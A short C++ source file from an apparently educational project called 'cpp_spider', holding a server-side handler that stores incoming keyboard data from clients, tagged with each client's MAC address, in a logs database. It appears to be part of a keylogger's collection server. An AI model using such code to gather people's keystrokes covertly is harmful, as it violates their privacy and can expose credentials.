/*
** KeyboardCommand.cpp for cpp_spider in /home/gogo/rendu/cpp_spider/server/src/Spider/Commands/commands/KeyboardCommand.cpp
**
** Made by Gauthier Cler
** Login   <gauthier.cler@epitech.eu>
**
** Started on  Sun Oct 08 19:44:24 2017 Gauthier Cler
** Last update Sun Oct 08 19:44:24 2017 Gauthier Cler
*/

#include "KeyboardCommand.hpp"

bool Spider::Commands::KeyboardCommand::run(const std::string &data, Spider::Network::Client::instance client, DB::Manager &manager) {
  DB::Model key("keyboard");

  key.load(data);
  key.add("client_mac", client->getMac());
  manager["logs"]->insert(key);
  return true;
}
